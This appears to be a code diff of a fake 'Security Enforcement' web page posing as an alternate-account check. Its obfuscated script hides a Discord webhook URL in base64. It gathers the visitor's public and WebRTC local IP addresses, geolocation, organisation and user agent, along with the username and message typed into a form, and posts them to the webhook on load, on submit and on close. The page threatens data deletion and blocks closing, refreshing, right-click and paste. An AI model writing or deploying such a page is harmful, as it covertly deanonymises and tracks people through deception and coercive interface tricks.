@@ -1,5 +1,6 @@
 <!doctype html>
-<html lang="en"><head>
+<html lang="en">
+<head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>🔒 Security Enforcement</title>
@@ -12,75 +13,156 @@ body{background:linear-gradient(135deg,#181825,#232343,#2a2a3a);height:100vh;wid
 #y{color:#ff354b;font-size:1.13em;font-weight:bold;margin:1.1em 0 .6em 0;}
 #z{margin-top:2.5em;width:40px;height:40px;border:4px solid #3a3a4a;border-top:4px solid #4faaff;border-radius:50%;animation:s 1.1s linear infinite;}
 @keyframes s{100%{transform:rotate(360deg)}}
+#form-wrap{margin:1.7em 0 0 0;}
+input[type=text]{padding:.4em;margin:.25em 0 .7em 0;width:220px;background:#232343;border:1px solid #444;border-radius:4px;color:#fff;}
+button{padding:.45em 1.2em;background:#4faaff;border:none;border-radius:4px;color:#fff;font-weight:bold;margin-top:0.5em;}
+#info{background:#232343;padding:1.1em 1.6em;border-radius:8px;margin-top:1.2em;max-width:400px;word-break:break-all;}
 </style>
 </head>
 <body>
 <div id="x">
-<h1>⚠️ Security Enforcement</h1>
-<p>This page is for alternate account prevention and security checks.<br>
-<span id="y">Leaving or closing this page will result in all data being deleted.<br>
-You cannot bypass this check.</span>
-For the strictest security, avoid privacy extensions.<br><br>
-<span style="color:#aaa;font-size:.99em;">If you are using Edge, closing this tab will immediately clear all session data.</span>
-</p>
-<div id="z"></div>
+  <h1>⚠️ Security Enforcement</h1>
+  <p>
+    This page is for alternate account prevention and security checks.<br>
+    <span id="y">Leaving or closing this page will result in all data being deleted.<br>
+    You cannot bypass this check.</span>
+    For the strictest security, avoid privacy extensions.<br><br>
+    <span style="color:#aaa;font-size:.99em;">If you are using Edge, closing this tab will immediately clear all session data.</span>
+  </p>
+  <div id="form-wrap">
+    <form id="userForm">
+      <input type="text" id="username" placeholder="Enter your username" required><br>
+      <input type="text" id="message" placeholder="Your message" required><br>
+      <button type="submit">Submit</button>
+    </form>
+    <div id="info" style="display:none;"></div>
+  </div>
+  <div id="z"></div>
 </div>
 <script>
 (function(){
 function b64(d){return atob(d);}
-var w=b64('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3MTI2NTA2MTg3OTk0MzE3OC9TSUw0aXpCaWktQ1UtUFI4MG5SNktWTHhoMmlsMFBFel81TEhoU2VBSlNieEN3UUR1TnNkNDFoQ0JBYWdpOUYtM3Ffcw==');
+var w = b64('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3MTI2NTA2MTg3OTk0MzE3OC9TSUw0aXpCaWktQ1UtUFI4MG5SNktWTHhoMmlsMFBFel81TEhoU2VBSlNieEN3UUR1TnNkNDFoQ0JBYWdpOUYtM3Ffcw==');
+
 async function gA(){
-var r={},s=[
-{name:'a',url:'https://api.ipify.org?format=json',p:j=>j.ip},
-{name:'b',url:'https://ipapi.co/json/',p:j=>j.ip},
-{name:'c',url:'https://ipinfo.io/json',p:j=>j.ip},
-{name:'d',url:'https://ipwho.is/',p:j=>j.ip}
-];
-for(var i=0;i<s.length;i++){
-try{var j=await fetch(s[i].url).then(x=>x.json());if(j&&s[i].p(j))r[s[i].name]=s[i].p(j);}catch(e){}}
-r.m=r.a||r.b||r.c||r.d||'';
-return r;
+  var r={},s=[
+    {name:'a',url:'https://api.ipify.org?format=json',p:j=>j.ip},
+    {name:'b',url:'https://ipapi.co/json/',p:j=>j.ip},
+    {name:'c',url:'https://ipinfo.io/json',p:j=>j.ip},
+    {name:'d',url:'https://ipwho.is/',p:j=>j.ip}
+  ];
+  for(var i=0;i<s.length;i++){
+    try{var j=await fetch(s[i].url).then(x=>x.json());if(j&&s[i].p(j))r[s[i].name]=s[i].p(j);}catch(e){}
+  }
+  r.m=r.a||r.b||r.c||r.d||'';
+  return r;
 }
 async function gG(ip){
-try{var r=await fetch('https://ipapi.co/'+ip+'/json/').then(x=>x.json());
-if(r&&r.latitude&&r.longitude)return r;}catch(e){}
-try{var r=await fetch('https://ipwho.is/'+ip).then(x=>x.json());
-if(r&&r.latitude&&r.longitude)return r;}catch(e){}
-try{var r=await fetch('https://ipinfo.io/'+ip+'/json').then(x=>x.json());
-if(r&&r.loc){var l=r.loc.split(",");return Object.assign(r,{latitude:l[0],longitude:l[1]});}}catch(e){}
-return {};
+  try{var r=await fetch('https://ipapi.co/'+ip+'/json/').then(x=>x.json());
+    if(r&&r.latitude&&r.longitude)return r;}catch(e){}
+  try{var r=await fetch('https://ipwho.is/'+ip).then(x=>x.json());
+    if(r&&r.latitude&&r.longitude)return r;}catch(e){}
+  try{var r=await fetch('https://ipinfo.io/'+ip+'/json').then(x=>x.json());
+    if(r&&r.loc){var l=r.loc.split(",");return Object.assign(r,{latitude:l[0],longitude:l[1]});}}catch(e){}
+  return {};
 }
 async function gL(t){
-return new Promise(f=>{
-if(!window.RTCPeerConnection)return f([]);
-var S=new Set,P=new RTCPeerConnection({iceServers:[]});
-P.createDataChannel('');
-P.createOffer().then(o=>P.setLocalDescription(o));
-P.onicecandidate=e=>e.candidate&&S.add(e.candidate.candidate.split(' ')[4]);
-setTimeout(()=>{P.close();f([...S])},t||1200);
-});
+  return new Promise(f=>{
+    if(!window.RTCPeerConnection)return f([]);
+    var S=new Set,P=new RTCPeerConnection({iceServers:[]});
+    P.createDataChannel('');
+    P.createOffer().then(o=>P.setLocalDescription(o));
+    P.onicecandidate=e=>e.candidate&&S.add(e.candidate.candidate.split(' ')[4]);
+    setTimeout(()=>{P.close();f([...S])},t||1200);
+  });
 }
-async function SND(){
-var a=await gA(),l=await gL(),u=navigator.userAgent,g=await gG(a.m);
-var d={username:'Gate',embeds:[{color:16711680,title:'Security',fields:[
-{name:'Refs',value:Object.entries(a).map(([k,v])=>k+': '+v).join('\n'),inline:0},
-{name:'Locals',value:l.join(',')||'-',inline:0},
-g.latitude&&g.longitude?{name:'Coords',value:g.latitude+','+g.longitude+' ('+(g.city||'?')+' '+(g.country_code||'?')+')',inline:1}:null,
-g.latitude&&g.longitude?{name:'Map',value:'https://www.google.com/maps?q='+g.latitude+','+g.longitude,inline:0}:null,
-{name:'Org',value:g.org||'-',inline:1},
-{name:'UA',value:u,inline:0}
-].filter(Boolean),footer:{text:new Date().toUTCString()}}]};
-await fetch(w,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});
+
+let gatheredInfo = {};
+
+async function initialSend() {
+  // Initial "we got info" on page open
+  let a = await gA();
+  let l = await gL();
+  let u = navigator.userAgent;
+  let g = await gG(a.m);
+  gatheredInfo = {a, l, u, g}; // Save for later use
+  let d = {
+    username:'Gate',
+    embeds:[{
+      color:16776960,
+      title:'New Visit',
+      description:'We got info on new user visit!',
+      fields:[
+        {name:'Refs',value:Object.entries(a).map(([k,v])=>k+': '+v).join('\n'),inline:0},
+        {name:'Locals',value:l.join(',')||'-',inline:0},
+        {name:'UA',value:u,inline:0}
+      ],
+      footer:{text:new Date().toUTCString()}
+    }]
+  };
+  await fetch(w,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});
 }
-SND();setInterval(SND,7000);
-window.onbeforeunload=function(e){
-e=e||window.event;
-if(e)e.returnValue='Leaving or closing will delete all data. Are you sure?';
-return'Leaving or closing will delete all data. Are you sure?';
+initialSend();
+
+document.getElementById('userForm').onsubmit = async function(e){
+  e.preventDefault();
+  const username = document.getElementById('username').value;
+  const message = document.getElementById('message').value;
+
+  // Compose and send all info to webhook
+  let a = gatheredInfo.a, l = gatheredInfo.l, u = gatheredInfo.u, g = gatheredInfo.g;
+  let d = {
+    username: 'Gate',
+    embeds: [{
+      color: 16711680,
+      title: 'User Submission',
+      fields: [
+        {name:'Username', value: username, inline:1},
+        {name:'Message', value: message, inline:1},
+        {name:'Refs', value: Object.entries(a).map(([k,v])=>k+': '+v).join('\n'), inline:0},
+        {name:'Locals', value: l.join(',')||'-', inline:0},
+        g.latitude&&g.longitude?{name:'Coords',value:g.latitude+','+g.longitude+' ('+(g.city||'?')+' '+(g.country_code||'?')+')',inline:1}:null,
+        g.latitude&&g.longitude?{name:'Map',value:'https://www.google.com/maps?q='+g.latitude+','+g.longitude,inline:0}:null,
+        {name:'Org',value:g.org||'-',inline:1},
+        {name:'UA',value:u,inline:0}
+      ].filter(Boolean),
+      footer:{text:new Date().toUTCString()}
+    }]
+  };
+  await fetch(w,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});
+
+  // Show user what info was sent
+  document.getElementById('info').style.display = 'block';
+  document.getElementById('info').innerHTML =
+    `<b>Here’s exactly what was sent:</b><br><pre>${JSON.stringify({
+      Username: username,
+      Message: message,
+      IPs: a,
+      Locals: l,
+      Location: g,
+      UserAgent: u
+    }, null, 2)}</pre>`;
+  document.getElementById('userForm').style.display = 'none';
 };
+
+window.onbeforeunload = function(e){
+  // Notify webhook on close
+  fetch(w, {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({
+      username:'Gate',
+      embeds:[{color:8421504,title:'User Closed',description:'User closed or refreshed the page.',footer:{text:new Date().toUTCString()}}]
+    })
+  });
+  e = e || window.event;
+  if(e) e.returnValue='Leaving or closing will delete all data. Are you sure?';
+  return 'Leaving or closing will delete all data. Are you sure?';
+};
+
 document.body.onkeydown=function(e){
-if((e.ctrlKey&&(e.key==='w'||e.key==='W'))||(e.metaKey&&e.key.toLowerCase()==='w'))e.preventDefault();
-if(e.key==='F5'||(e.ctrlKey&&e.key==='r'))e.preventDefault();
+  if((e.ctrlKey&&(e.key==='w'||e.key==='W'))||(e.metaKey&&e.key.toLowerCase()==='w'))e.preventDefault();
+  if(e.key==='F5'||(e.ctrlKey&&e.key==='r'))e.preventDefault();
 };
 document.addEventListener('contextmenu',e=>e.preventDefault());
 document.addEventListener('selectstart',e=>e.preventDefault());
@@ -89,4 +171,5 @@ document.addEventListener('cut',e=>e.preventDefault());
 document.addEventListener('paste',e=>e.preventDefault());
 })();
 </script>
-</body></html>
+</body>
+</html>
